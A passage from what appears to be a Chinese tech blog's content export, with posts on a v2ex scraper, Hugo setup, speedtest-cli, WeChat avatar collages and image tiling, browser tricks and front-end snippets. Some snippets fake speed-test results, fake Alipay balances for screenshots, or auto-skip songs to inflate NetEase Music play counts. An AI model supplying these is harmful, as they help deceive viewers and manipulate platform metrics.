'https://www.v2ex.com'total = []def crawl(url): tree = lt.fetch(url) items = tree.css('#TopicsNode .cell') for item in items: data = &#123;&#125; data['title'] = item.css('span.item_title a::text').extract_first() data['author'] = item.css('span.small.fade strong a::text').extract_first() data['source'] = f"&#123;domain&#125;&#123;item.css('span.item_title a::attr(href)').extract_first()&#125;" reply = item.css('a.count_livid::text').extract_first() data['reply'] = int(reply) if reply else 0 pprint(data) total.append(data) time.sleep(1)if __name__ == '__main__': tasklist = [f'&#123;domain&#125;/go/python?p=&#123;n&#125;' for n in range(1, 10)] [crawl(task) for task in tasklist] lt.save(total, name='v2ex.csv', sort_by='reply', order='desc') 抓取10页python主题的数据，按照回复数倒序排列123456789,author,reply,source,title0,chinesehuazhou,127,https://www.v2ex.com/t/562327#reply127,10 行 Python 代码，批量压缩图片 500 张，简直太强大了（内有公号宣传，不喜勿进）1,chinesehuazhou,103,https://www.v2ex.com/t/557286#reply103,len(x) 击败 x.len()，从内置函数看 Python 的设计思想（内有公号宣传，不喜勿进）2,nfroot,73,https://www.v2ex.com/t/555249#reply73,面对 Python 的强大和难用性表示深深的迷茫，莫非打开方式不对？3,css3,58,https://www.v2ex.com/t/554724#reply58,你们用什么工具来管理 Python 的库啊？4,Northxw,54,https://www.v2ex.com/t/558529#reply54,花式反爬之某众点评网5,akmonde,48,https://www.v2ex.com/t/559926#reply48,Python 项目移植到其他机器，要求全 Linux 系统适配6,kayseen,47,https://www.v2ex.com/t/562683#reply47,这道 Python 题目有大神会做吗?7,hellomacos,41,https://www.v2ex.com/t/562413#reply41,老生常谈的问题：如何学好 Python 公众号：苏生不惑]]></content>
      <tags>
        <tag>python</tag>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5 分钟使用 hugo 搭建一个自己的博客]]></title>
    <url>%2F2019%2F05%2F22%2F5-%E5%88%86%E9%92%9F%E4%BD%BF%E7%94%A8-hugo-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[Hugo是由Go语言实现的静态网站生成器。相比hexo更简单、易用、高效、易扩展、快速部署。 安装Hugo下载二进制进入github下载地址，选择对应系统的二进制文件，比如我的电脑windows 64位就下载 hugo_0.55.5_Windows-64bit.zip 解压出来就是一个EXE文件，加入到环境变量即可 源码安装先安装go，git，设置GOPATH命令行执行 go get -u -v github.com/spf13/hugo，成功后会生成二进制文件 生成站点打开命令行，我使用的是cmder，当然自带的cmd也行。123mkdir blogcd bloghugo new site . 目录结构为 编写正文使用md语法编辑文件12hugo new hello.mdvi hello.md 下载主题12cd themesgit clone https://github.com/spf13/hyde.git 运行Hugo123456789101112131415161718192021hugo server --theme=hyde --buildDraftsBuilding sites … | EN+------------------+----+ Pages | 11 Paginator pages | 0 Non-page files | 0 Static files | 6 Processed images | 0 Aliases | 0 Sitemaps | 1 Cleaned | 0Total in 335 msWatching for changes in d:\blog\&#123;content,data,layouts,static,themes&#125;Watching for config changes in d:\blog\config.tomlEnvironment: "development"Serving pages from memoryRunning in Fast Render Mode. For full rebuilds on change: hugo server --disableFastRenderWeb Server is available at http://localhost:1313/ (bind address 127.0.0.1)Press Ctrl+C to stop 浏览器里打开： http://localhost:1313 部署到github在github建立一个repo，比如username.github.io，注意username为自己的用户名，不能为其他的。hugo --theme=hyde --baseUrl=&quot;http://xxx.github.io/&quot;这样静态页面都会生成到 public 目录，将pubilc目录里所有文件 push 到刚创建的Repo的 master 分支就可以了。123456 cd public git initgit remote add origin https://github.com/xxx/xxx.github.io.git git add . git commit -m "hugo" git push -u origin master 打开浏览器访问：http://xxx.github.io/ 好了，你的博客搭建成功了，开始你的博客之旅吧。公众号：苏生不惑]]></content>
      <tags>
        <tag>golang</tag>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令行工具之 speedtest 测试网速]]></title>
    <url>%2F2019%2F05%2F22%2F%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%E4%B9%8B-speedtest-%E6%B5%8B%E8%AF%95%E7%BD%91%E9%80%9F%2F</url>
    <content type="text"><![CDATA[介绍一个专业的网络测速工具speedtest https://www.speedtest.net/，国内有对应站点 http://www.speedtest.cn/ 下载和上传网络数据传输分为发送数据和接收数据两部分。上传就是向外部发送数据，下载为从外部接收数据。它们都受网络带宽和设备性能制约。 在日常网络传输中大致1Mbps=125KB/s（1:8换算）。1M宽带即指1Mbps=1000Kbps=1000/8KBps=125KBps； 因此1M的带宽下载的速度一般不会超过125KB每秒。例如上行的网络带宽为100Mbps,那么最大上传速度就是12500KB/s，也就是12.5MB/s。 用户申请的宽带业务速率指技术上所能达到的最大理论速率值，用户上网时还受到用户电脑软硬件的配置、所浏览网站的位置、对端网站带宽等情况的影响，故用户上网时的速率通常低于理论速率值。 理论上：2M（即2Mb/s）宽带理论速率是：256KB/s（即256*8=2048Kb/s），实际速率大约为103–200kB/s；4M（即4Mb/s）的宽带理论速率是：512KB/s，实际速率大约为200—440kB/s。 安装pip install speedtest-cli或者下载这个文件 https://raw.github.com/sivel/speedtest-cli/master/speedtest.py 修改文件名为 speed-cli即可。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950λ speed-cli -husage: speed-cli.py [-h] [--no-download] [--no-upload] [--single] [--bytes] [--share] [--simple] [--csv] [--csv-delimiter CSV_DELIMITER] [--csv-header] [--json] [--list] [--server SERVER] [--exclude EXCLUDE] [--mini MINI] [--source SOURCE] [--timeout TIMEOUT] [--secure] [--no-pre-allocate] [--version]Command line interface for testing internet bandwidth using speedtest.net.--------------------------------------------------------------------------https://github.com/sivel/speedtest-clioptional arguments: -h, --help show this help message and exit --no-download Do not perform download test --no-upload Do not perform upload test --single Only use a single connection instead of multiple. This simulates a typical file transfer. --bytes Display values in bytes instead of bits. Does not affect the image generated by --share, nor output from --json or --csv --share Generate and provide a URL to the speedtest.net share results image, not displayed with --csv --simple Suppress verbose output, only show basic information --csv Suppress verbose output, only show basic information in CSV format. Speeds listed in bit/s and not affected by --bytes --csv-delimiter CSV_DELIMITER Single character delimiter to use in CSV output. Default "," --csv-header Print CSV headers --json Suppress verbose output, only show basic information in JSON format. Speeds listed in bit/s and not affected by --bytes --list Display a list of speedtest.net servers sorted by distance --server SERVER Specify a server ID to test against. Can be supplied multiple times --exclude EXCLUDE Exclude a server from selection. Can be supplied multiple times --mini MINI URL of the Speedtest Mini server --source SOURCE Source IP address to bind to --timeout TIMEOUT HTTP timeout in seconds. Default 10 --secure Use HTTPS instead of HTTP when communicating with speedtest.net operated servers --no-pre-allocate Do not pre allocate upload data. Pre allocation is enabled by default to improve upload performance. To support systems with insufficient memory, use this option to avoid a MemoryError --version Show the version number and exit 使用1234567891011λ speed-cli --shareRetrieving speedtest.net configuration...Testing from China Network Information Center (218.98.33.181)...Retrieving speedtest.net server list...Selecting best server based on ping...Hosted by China Mobile Group Beijing Co.Ltd (Beijing) [1.67 km]: 8.13 msTesting download speed................................................................................Download: 18.58 Mbit/sTesting upload speed......................................................................................................Upload: 5.79 Mbit/sShare results: http://www.speedtest.net/result/8272084022.png 我电脑下载速度 18.58 Mbit/s，在网站 https://cn.office-converter.com/Bandwidth-3 换算下就是2.32MB/s 生成的图片地址http://www.speedtest.net/result/8272084022.png 可以分享给他人。 装逼测速看别人分享的网速比自己快那么多，想盘他们怎么办？用speedtest-fake12345678910λ php speedtest.phpRetrieving speedtest.net configuration...Testing from China Telecom Guangdong (183.15.xxx.xx)...Retrieving speedtest.net server list...Selecting best server based on ping...Hosted by W Professional Services Limited (New Territories) [18.14 km]: 43.12 msTesting download speed................................................................................Download: 14770.61 Mbit/sTesting upload speed................................................................................................Upload: 10512.14 Mbit/s 14770.61 Mbit/s 够装逼用了，当然这个只能截图了。 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[听说你想 520 表白]]></title>
    <url>%2F2019%2F05%2F22%2F%E5%90%AC%E8%AF%B4%E4%BD%A0%E6%83%B3-520-%E8%A1%A8%E7%99%BD%2F</url>
    <content type="text"><![CDATA[又到520，一个狂虐单身狗的日子，看看知乎的热门话题： 这里给大家提供几个虐狗的新姿势。 69表白从 69 开始，给对方发个网页 http://118.24.158.116:8888/loveyou.html用浏览器打开，按Ctrl+f 输入9，效果就出来了。 表白网页生成器打开网站 https://res.luyi.org/love/ ，填入要表白的内容：生成好的网页 https://res.luyi.org/love/love.php?me=%E6%9D%A8%E8%BF%87&amp;you=%E5%B0%8F%E9%BE%99%E5%A5%B3&amp;yi=%E8%BF%87%E5%84%BF%E7%88%B1%E4%BD%A0%E4%B8%80%E7%94%9F%E4%B8%80%E4%B8%96&amp;wu=%E5%B0%B1%E6%98%AF%E7%88%B1%E4%BD%A0&amp;year=2019&amp;yue=5&amp;ri=20&amp;submit= 百度传情其实百度很早就有个传情功能，直接百度输入 表白 即可。 输入好对方名字和留言，点击生成爱情密码，可以自定义4-8位密码（不能和别人的重合），也可以随机生成。比如我生成的这个密码数字 20196699，然后让对方百度输入 解蜜20196699 就可以看到你对她的表白了，而且这个网页百度会一直保存着。https://www.baidu.com/s?wd=%E8%A7%A3%E8%9C%9C20196699&amp;rsv_spt=1&amp;rsv_iqid=0xcae3b6f70000da9b&amp;issp=1&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8&amp;rqlang=cn&amp;tn=baiduhome_pg&amp;rsv_enter=0&amp;oq=%25E8%25A7%25A3%25E8%259C%259C24667500&amp;inputT=78350&amp;rsv_t=e116MvmallMxcerBcArNhKG5nWP9%2Frtb8bi42ZMA4nB8T9%2BHXGkc%2FkkS5F3U%2FpQ0F7Sf&amp;rsv_pq=bf13f0e60003d3e4&amp;rsv_sug3=44&amp;rsv_sug2=0&amp;rsv_sug4=78350 当然如果觉得以上都太虚的话，没事，微信都为你准备好了，每到这一天微信红包提高到 520，记得备好红包！当然首先你得有个女朋友。。。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信好友头像拼图]]></title>
    <url>%2F2019%2F05%2F22%2F%E5%BE%AE%E4%BF%A1%E5%A5%BD%E5%8F%8B%E5%A4%B4%E5%83%8F%E6%8B%BC%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[微信机器人相信很多人在群里见过，大部分是基于itchat开发的，今天就用基于 itchat 的wxpy 将你的微信好友头像拼接成一张图片。 安装 wxpy直接pip install wxpy 即可。123456789101112131415161718192021λ wxpy -husage: wxpy [-h] [-c] [-q width] [-l level] [-s shell] [-v] [bot [bot ...]]Run a wxpy-ready python console.positional arguments: bot One or more variable name(s) for bot(s) to init (default: None).optional arguments: -h, --help show this help message and exit -c, --cache Cache session(s) for a short time, or load session(s) from cache (default: disabled). -q width, --console_qr width The width for console_qr (default: None). -l level, --logging_level level Logging level (default: INFO). -s shell, --shell shell Specify which shell to use: ipython, bpython, or python (default: the first available). -v, --version Show version and exit. 源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# -*- coding: utf-8 -*-from wxpy import *import mathfrom PIL import Imageimport osprint('双击exe执行，用微信扫描弹出的二维码，确认后等待一段时间，会在本地生成合成文件mywechat.png，有问题@苏生不惑')# def creat_filepath(): avatar_dir = os.getcwd() + "\\wechat_pic\\" if not os.path.exists(avatar_dir): os.mkdir(avatar_dir) return avatar_dirdef save_avatar(avatar_dir): # bot = Bot() friends = bot.friends(update=True) print(friends.stats_text()) # 下载 num = 0 for friend in friends: friend.get_avatar(avatar_dir + '\\' + str(num) + ".jpg") print('好友昵称:%s' % friend.nick_name) num = num + 1def joint_avatar(path): # length = len(os.listdir(path)) # image_size = 2560 # each_size = math.ceil(2560 / math.floor(math.sqrt(length))) # x_lines = math.ceil(math.sqrt(length)) y_lines = math.ceil(math.sqrt(length)) image = Image.new('RGB', (each_size * x_lines, each_size * y_lines)) x = 0 y = 0 for (root, dirs, files) in os.walk(path): for pic_name in files: try: with Image.open(path + pic_name) as img: img = img.resize((each_size, each_size)) image.paste(img, (x * each_size, y * each_size)) x += 1 if x == x_lines: x = 0 y += 1 except IOError: print("头像读取失败") img = image.save(os.getcwd() + "/mywechat.png") print('微信好友头像拼接完成!')if __name__ == '__main__': avatar_dir = creat_filepath() save_avatar(avatar_dir) joint_avatar(avatar_dir) 使用python wechat.py将会弹出二维码，打开微信扫描登录，如果你的好友过千的话需要等待一段时间。 12Login successfully as 风吹麦浪好友昵称:风吹麦浪 效果最后生成了所有好友的微信头像拼图，我的好友才100多人，所以生成的头像还能看清，如果有几千好友的话头像会很小，需要放大才能看到。 所有好友的微信头像都下载到本地了。 赶紧发条朋友圈去装逼吧，哈哈。 如果你不会代码的话，我生成了一个EXE文件，只需要在电脑双击执行这个EXE就能自动拼图了。 关注本公众号，回复 微信拼图 获取EXE下载链接，暂时只支持windows系统。]]></content>
      <tags>
        <tag>微信</tag>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[朋友圈九宫格图片]]></title>
    <url>%2F2019%2F05%2F22%2F%E6%9C%8B%E5%8F%8B%E5%9C%88%E4%B9%9D%E5%AE%AB%E6%A0%BC%E5%9B%BE%E7%89%87%2F</url>
    <content type="text"><![CDATA[朋友圈和微博的图片都是九宫格，如何让一张图切为9图呢，在github上找到 https://github.com/yumendy/nine_picture 这个项目。 安装pilpip install pillow 源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from PIL import Imageimport sysclass NinePictures(object): def __init__(self, file_path, mode): self.image = Image.open(file_path) self.width, self.height = self.image.size if mode == 'C': self.length = self.width if self.width &lt; self.height else self.height self.cut_image() elif mode == 'F': self.length = self.width if self.width &gt; self.height else self.height self.fill_image() def cut_image(self): if self.width &lt; self.height: self.cut_height() elif self.width &gt; self.height: self.cut_width() def cut_height(self): box = (0, (self.height - self.width) / 2, self.width, (self.height + self.width) / 2) self.image = self.image.crop(box) def cut_width(self): box = ((self.width - self.height) / 2, 0, (self.height + self.width) / 2, self.height) self.image = self.image.crop(box) def fill_image(self): new_image = Image.new(self.image.mode, (self.length, self.length), color='white') if self.width &gt; self.height: self.fill_height(new_image) elif self.width &lt; self.height: self.fill_width(new_image) def fill_height(self, new_image): new_image.paste(self.image, (0, (self.length - self.height) / 2)) self.image = new_image def fill_width(self, new_image): new_image.paste(self.image, ((self.length - self.width) / 2, 0)) self.image = new_image def process(self): length = self.length / 3 left_list = [0, length, length * 2] * 3 upper_list = [0] * 3 + [length] * 3 + [length * 2] * 3 right_list = [length, length * 2, length * 3] * 3 lower_list = [length] * 3 + [length * 2] * 3 + [length * 3] * 3 box_list = zip(left_list, upper_list, right_list, lower_list) image_list = [self.image.crop(box) for box in box_list] return image_list def save_image(self): image_list = self.process() order_number = 1 for image in image_list: image.save(str(order_number) + '.png', 'PNG') order_number += 1if __name__ == '__main__': image_mode = sys.argv[1] image_path = sys.argv[2] app = NinePictures(image_path, image_mode) app.save_image() 使用123python main.py C image_path # 居中裁剪python main.py F image_path # 白色填充 以我的公众号图片为例 python main.py C qr.jpg 效果原图 九宫格，来自微博 现在可以去朋友圈试试了。]]></content>
      <tags>
        <tag>微信</tag>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ppt 神器 reveal]]></title>
    <url>%2F2019%2F05%2F22%2Fppt-%E7%A5%9E%E5%99%A8-reveal%2F</url>
    <content type="text"><![CDATA[ppt相信大家都用过，不过程序员使用的PPT是可以在网页上用的，比如 reveal 安装先安装好node1234567891011121314151617181920212223npm install -g reveal-mdλ reveal-md -hPuppeteer unavailable, unable to create featured slide image for OpenGraph metadata.Puppeteer unavailable, unable to generate PDF file.Usage: cli &lt;slides.md&gt; [options]See https://github.com/webpro/reveal-md for more details.Options: -V, --version output the version number --title &lt;title&gt; Title of the presentation -s, --separator &lt;separator&gt; Slide separator [default: 3 dashes (---) surrounded by two blank lines] -S, --vertical-separator &lt;separator&gt; Vertical slide separator [default: 4 dashes (----) surrounded by two blank lines] -t, --theme &lt;theme&gt; Theme [default: black] --highlight-theme &lt;theme&gt; Highlight theme [default: zenburn] --css &lt;files&gt; CSS files to inject into the page --scripts &lt;files&gt; Scripts to inject into the page --assets-dir &lt;dirname&gt; Defines assets directory name [default: _assets] --preprocessor &lt;script&gt; Markdown preprocessor script --template &lt;filename&gt; Template file for reveal.js --listing-template &lt;filename&gt; Template file for listing --print [filename] Print to PDF file --static [dir] Export static html to directory [_static]. Incompatible with --print. 使用vi test.mdreveal-md test.mdreveal-md slides.md –port 8888浏览器打开localhost:8888 即可在网页上演示PPT了。 资源 reveal-md使用 Jupyter python markdown 制作分享 pptnodeppt 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>ppt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的浏览器奇技淫巧]]></title>
    <url>%2F2019%2F05%2F22%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[平常工作少不了用浏览器，以下分享一些浏览器的使用技巧，更好的有助于你的工作。 ps: 以下技巧均在 Chrome 浏览器下测试的。 网页长截图按 F12 弹出控制台，按 ctrl+shift+p 弹出输入框输入full，选择 capture full size screenshot 然后点击就会对当前网页进图并生成下载一个图片。这个比用 QQ 截图好用的地方就是有滚动条的网页也可以全部截图到，所以叫长截图。 浏览器秒变编辑器浏览器地址栏中输入 data:text/html, &lt;html contenteditable&gt;回车直接变编辑器，这里可以直接输入字符进行编辑了。 编辑网页打开网站，地址栏输入javascript:void(document.body.contentEditable=&#39;true&#39;);当然也可以直接在控制台输入 document.body.contentEditable=true或document.designMode = &quot;on&quot;然后就可以随心所欲的改变网页内容了，所以一些网页截图不可信，比如之前有人借用王思聪名义用微博发支付宝的红包，可谓套路满满。 突破禁止复制有些网站是复制不了内容的，比如b站 的文章https://www.bilibili.com/read/cv2444771?from=category_0 ，这个时候就需要用上控制台了（按F12打开）。点击左上角箭头，选择网页内容，可以在控制台看到内容，直接复制就行了。 多账号登录平常一个浏览器只能登录一个账号，如果要登2个账号，就需要使用多个浏览器，如果只有一个浏览器怎么办，使用隐身模式（按ctrl+shift+n进入），然后登录另外一个账号。 下载网页图片想下载网页上的图片，如果一张一张的另存为，那得费不少体力，这个时候就需要控制台了。比如经常逛知乎可以看到不少妹子自拍，比如这个问题https://www.zhihu.com/question/26297181/answer/633004295 打开控制台执行这个 copy($$(&#39;img&#39;).map(function(item){return item.src}).join(&quot;\r\n&quot;))或者[...$$(&quot;img&quot;)].map(a =&gt; a.src).join(&#39;\r\n&#39;)就可以将所有图片地址复制好了。复制所有链接使用copy($$(&#39;a&#39;).map(function(item){return item.href;})) 然后把这些地址放在一个文件url.txt内。 接下来用wget一键下载。wget -i url.txt -P ./zhihu 所有图片都下载到本地目录zhihu了。 另外关于知乎还有个隐藏技能，按?可以打开快捷键帮助，不用鼠标也可以玩知乎了，微博也有这功能。 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>奇技淫巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端代码收集]]></title>
    <url>%2F2019%2F05%2F21%2F%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[编辑网页1document.designMode = "on" Console中的技巧12345chrome会帮你buffer 5个你查看过的DOM对象，你可以直接在Console中用 $0, $1, $2, $3, $4来访问。你还可以使用像jQuery那样的语法来获得DOM对象，如：$("#mydiv")你还可使用 $$(".class") 来选择所有满足条件的DOM对象。你可以使用 getEventListeners($("selector")) 来查看某个DOM对象上的事件还可以使用 monitorEvents($("selector")) 来监控相关的事件 将内容复制到剪贴板12345678910111213141516171819202122232425262728&lt;input id="demoInput" value="hello world"&gt;&lt;button id="btn"&gt;点我复制&lt;/button&gt;const btn = document.querySelector('#btn')btn.addEventListener('click', () =&gt; &#123; const input = document.querySelector('#demoInput') input.select() if (document.execCommand('copy')) &#123; console.log('复制成功') &#125; else &#123; console.log('复制失败') &#125;&#125;)const btn = document.querySelector('#btn')btn.addEventListener('click', () =&gt; &#123; const input = document.createElement('input') document.body.appendChild(input) input.setAttribute('value', '复制我') input.select() if (document.execCommand('copy')) &#123; console.log('复制成功') &#125; else &#123; console.log('复制失败') &#125; document.body.removeChild(input)&#125;)https://blog.mutoe.com/2019/copy-content-to-clipboard-in-javascript/ 微信分享123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172var shareLinkUlr = location.href.split("#")[0]; // 获取当前的url 去掉 # 之后的部分shareLinkUlr = shareLinkUlr.replace(/\&amp;/g, '%26'); // 将 &amp; 替换成 %26var shareImgUrl = 'http://www.abc.com/images/logo300.jpg'; // 分享的图片地址// 获取 config 的内容function getjssdkconfig(apis,debug,json,link)&#123; //console.log(apis); //console.log(debug); //console.log(json); //console.log(link); var xhr = new XMLHttpRequest(); var url = 'http://www.abc.com/qxj_jssdkconfig'; // 这个就是easywechat生成的参数 var data = "apis="+apis+"&amp;debug="+debug+"&amp;json="+json+"&amp;url="+link; // 拼接 get 参数 xhr.open('GET',url+"?"+data); xhr.onreadystatechange = function()&#123; if(xhr.readyState===4 &amp;&amp; (xhr.status &gt;=200 &amp;&amp; xhr.status &lt;=300))&#123; // 获取 config 之后，进行一些操作 // 需要进行 JSON.parse 获取对象 configJsSDKAndDoSomething(JSON.parse(xhr.responseText)); &#125; &#125;; xhr.send();&#125;// 获取config 之后进行的操作// 因为是使用 ajax 进行config内容，这个方法是在上面运行的function configJsSDKAndDoSomething(config)&#123; wx.config(config); wx.ready(function() &#123; // 其他的一些操作 // ... //不是wifi环境下提示 wx.getNetworkType(&#123; success: function (res) &#123; var networkType = res.networkType; // 返回网络类型2g，3g，4g，wifi if(networkType!="wifi")&#123; console.log("当前你网络环境为"+networkType+""); &#125; &#125; &#125;); &#125;); wx.error(function(error)&#123; console.log(error); &#125;); wx.onMenuShareTimeline(&#123; title: '', // 分享标题 link: location.href, // 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致 imgUrl:shareImgUrl, // 分享图标 success: function () &#123; alert('分享成功'); &#125; &#125;); wx.onMenuShareAppMessage(&#123; title: '', // 分享标题 desc: '', // 分享描述 link: location.href, // 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致 imgUrl: shareImgUrl, // 分享图标 type: 'link', // 分享类型,music、video或link，不填默认为link success: function () &#123; &#125;, cancel: function () &#123; &#125; &#125;);&#125;// 页面加载完之后进行操作$(document).ready(function()&#123; // 注意这里的参数 // apis 使用的参数是 字符串的拼接 这个是和 php 的方法中的处理相对应的 getjssdkconfig("checkJsApi,onMenuShareTimeline,onMenuShareAppMessage,onMenuShareQQ,onMenuShareWeibo,onMenuShareQZone,hideMenuItems,showMenuItems,hideAllNonBaseMenuItem,showAllNonBaseMenuItem,translateVoice,startRecord,stopRecord,onVoiceRecordEnd,playVoice,onVoicePlayEnd,pauseVoice,stopVoice,uploadVoice,downloadVoice,chooseImage,previewImage,uploadImage,downloadImage,getNetworkType,openLocation,getLocation,hideOptionMenu,showOptionMenu,closeWindow,scanQRCode,chooseWXPay,openProductSpecificView,addCard,chooseCard,openCard",false,false,shareLinkUlr);&#125;);https://learnku.com/laravel/t/30886 支付宝转账恶搞12345678910111213141516171819202122(function() &#123; /** 支付宝恶搞 **/ function inc(el) &#123; // 更新金额数字 el.innerHTML = el.innerHTML.replace(/\d+/, function(a) &#123; return +a + rnd(9); &#125;); &#125; function rnd(n) &#123; // 1-n 随机数https://www.cnblogs.com/52cik/p/js-alipay-jokes.html return Math.random() * n | 0; &#125; function joke(el) &#123; // 随机增加 inc(el); setTimeout(joke, rnd(1e3), el); &#125; var amount = document.getElementsByClassName("amount"); joke(amount[0]); // 账户余额 随机增加 joke(amount[1]); // 余额宝 随机增加&#125;)(); 奇葩字符（不可见字符）1234567891011121314 é 字符，他的 unicode 是 \u00e9, 但是也可以用 'e' + '\u0301' 实现 "é" 前者 length 是 1，后者 length 是 2。'\u0301' 在这里起到了语调符的作用，然后我就丧心病狂的 'e'+Array(20).join('\u0301'); '呵呵'+Array(20).join('\u0310'); // "呵呵̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐" '呵呵'+Array(20).join('\u031D'); // "呵呵̝̝̝̝̝̝̝̝̝̝̝̝̝̝̝̝̝̝̝" '呵呵'+Array(20).join('\u0E47'); // "呵呵็็็็็็็็็็็็็็็็็็็" '呵呵'+Array(20).join('\u0e49'); // "呵呵้้้้้้้้้้้้้้้้้้้" '呵呵'+Array(20).join('\u0598'); // "呵呵֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘"也可以这么玩... '呵呵'+Array(20).join('\u0310')+Array(20).join('\u0598')+Array(20).join('\u0e49'); // "呵呵้้้้้้้้้้้้้้้้้้้̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘"http://www.fileformat.info/info/unicode/category/Mn/list.htm 这里详细的列出了每个编码以及对应的意思，还有图片展现。https://www.cnblogs.com/52cik/p/unicode-mark-nonspacing.html#!comments Chrome 监听 console 打开1234567var re = /x/;var i = 0;console.log(re);re.toString = function () &#123; return '第 ' + (++i) + ' 次打开控制台';//https://www.52cik.com/2016/04/27/chrome-console-open.html&#125;; 操作之神奇的 date1234567891011121314151617181920212223242526272829303132// 获取月份天数function getMonthDayCount(year, month) &#123; return new Date(year, month, 0).getDate();&#125;console.log(getMonthDayCount(2017, 10)); // 31function getAllMonthDayCount(year) &#123; var days = [31, new Date(year, 2, 0).getDate(), 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]; return days;&#125;console.log(getAllMonthDayCount(2016));// [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]function isLeapYear(year) &#123; return (year % 4 == 0) &amp;&amp; (year % 100 != 0 || year % 400 == 0);&#125;function isLeapYear(year) &#123; return new Date(year, 2, 0).getDate() === 29;&#125;console.log([ isLeapYear(2000), isLeapYear(2016), isLeapYear(2017), isLeapYear(2018)]); // [ true, true, false, false ]// 10天后是几月几号var dt = new Date('2016-12-25');dt.setDate(dt.getDate() + 10);console.log(dt.toLocaleDateString()); // 2017/1/4// 10天前是几月几号https://www.52cik.com/2017/10/11/js-date-month.htmlvar dt = new Date('2017-01-04');dt.setDate(dt.getDate() - 10);console.log(dt.toLocaleDateString()); // 2016/12/25 日期是否是连续1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859let days = [ '2016-02-28', '2016-02-29', // 闰月 '2016-03-01', // 跨月 '2016-03-02', '2016-03-03',]// 先排序，然后转时间戳let _days = days.sort().map((d, i) =&gt; &#123; let dt = new Date(d) dt.setDate(dt.getDate() + 4 - i) // 处理为相同日期 return +dt&#125;)// 比较时间戳是否一致console.log( _days[0] == _days[1] &amp;&amp; _days[0] == _days[2] &amp;&amp; _days[0] == _days[3] &amp;&amp; _days[0] == _days[4])let days = [ '2016-02-28 12:00:00', '2016-02-29 12:00:01', // 闰月 '2016-03-01 12:00:02', // 跨月 '2016-03-02 12:00:03', '2016-03-03 12:00:04', '2016-03-04 12:00:04',]console.log(continueDays(days))function continueDays(arr_days) &#123; // 先排序，然后转时间戳 let days = arr_days.sort().map((d, i) =&gt; &#123; let dt = new Date(d) dt.setDate(dt.getDate() + 4 - i) // 处理为相同日期 // 抹去 时 分 秒 毫秒 dt.setHours(0) dt.setMinutes(0) dt.setSeconds(0) dt.setMilliseconds(0) return +dt &#125;) let ret = true days.forEach(d =&gt; &#123; if (days[0] !== d) &#123; ret = false &#125; &#125;) return ret&#125;https://www.52cik.com/2016/07/10/consecutive-dates.html 跨域代理工具123456789bing每日分享接口 http://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1 http://www.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&amp;mkt=zh-CN 直接在浏览器打开是如下的json,要拿到的就是url，直接在一个页面用js获取存在跨域问题，可以用代理工具 https://jsonp.afeld.me/ 我用的是第二个方法,把上面的api输入， 点击go得到一个经过代理后的api，如下 https://jsonp.afeld.me/?url=http%3A%2F%2Fcn.bing.com%2FHPImageArchive.aspx%3Fformat%3Djs%26idx%3D0%26n%3D1https://codepen.io/fazero/pen/KzooBZ https://blog.fazero.me/2016/04/14/js-get-bing-photo/ 网易云音乐刷听歌量12setInterval('document.getElementsByClassName("nxt")[0].click();console.log("Play OJBK. Next")',90000);https://www.mmuaa.com/post/cd44019a0e569d64.html emoji1234567891011121314151617// JavaScript 字符串编码使用 UTF-16 https://gist.github.com/justjavac/a5aa1c0d0d111cf19e852037f4c483db"💩".length === 2;"💩" === "\u&#123;1F4A9&#125;"; // es6"💩" === "\uD83D\uDCA9"; // es5// 同一个编码可能使用不同的码位"ò" === "ò"; // ❎"ò" === "\xF2"; // ✅"ò" === "o\u0300"; // ✅"o\u0300".normalize("NFC") === "\xF2"; // ✅ es6 提供了 normalize 函数"👨‍👩‍👧‍👦".length === 11;"👨‍👩‍👧‍👦" === "\u&#123;1F468&#125;\u200D\u&#123;1F469&#125;\u200D\u&#123;1F467&#125;\u200D\u&#123;1F466&#125;";"👨" === "\u&#123;1F468&#125;";"👩" === "\u&#123;1F469&#125;";"👧" === 